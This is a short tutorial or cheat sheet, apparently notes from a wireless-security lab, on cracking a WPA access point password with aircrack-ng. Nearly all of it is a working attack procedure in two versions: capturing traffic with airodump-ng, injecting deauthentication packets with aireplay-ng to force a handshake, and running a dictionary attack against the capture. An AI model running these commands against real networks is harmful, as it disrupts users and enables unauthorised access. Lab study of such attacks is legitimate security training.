# Aircrack-ng

This page shows how to crack an AP secret using just `aircrack-ng`.

## Steps

### Short Version
```bash
# Collect AP and client info
sudo airodump-ng wlan0mon

# Monitor and log AP and client info - keep running
sudo airodump-ng -c $CHAN -w $PCAP --essid $SSID --bssid $BSSID wlan0mon

# Inject some deauth packets to force client to reauthenticate
sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon

# Wait for captured handshake message
# Stop the capture

# Crack the key
aircrack-ng -w /usr/share/john/password.lst -e $SSID -b $BSSID $PCAP-01.cap
```

### Long Version
```bash
# Collect AP and client info
sudo airodump-ng wlan0mon

# Create an env file as a matter of convenience
vi config
export SSID=wifu
export BSSID=9C:53:22:03:18:E1
export CHAN=3
export PCAP=$SSID
export CLIENT=DC:A6:32:E9:B6:BD

# Save and source it
source config

# Use screen so we only need to log in once
screen

# Split windows vertically
ctrl-a |

# Monitor and log AP and client info
sudo airodump-ng -c $CHAN -w $PCAP --essid $SSID --bssid $BSSID wlan0mon

# Move to right window and create a new screen in it
ctrl-a tab
ctrl-a c

# Inject some deauth packets to force client to reauthenticate
sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon

# Navigate to the left window
ctrl-a tab

# Wait for the capatured handshake message
# Stop the capture
qq

# Crack the password
aircrack-ng -w /usr/share/john/password.lst -e $SSID -b $BSSID $PCAP-01.cap
```
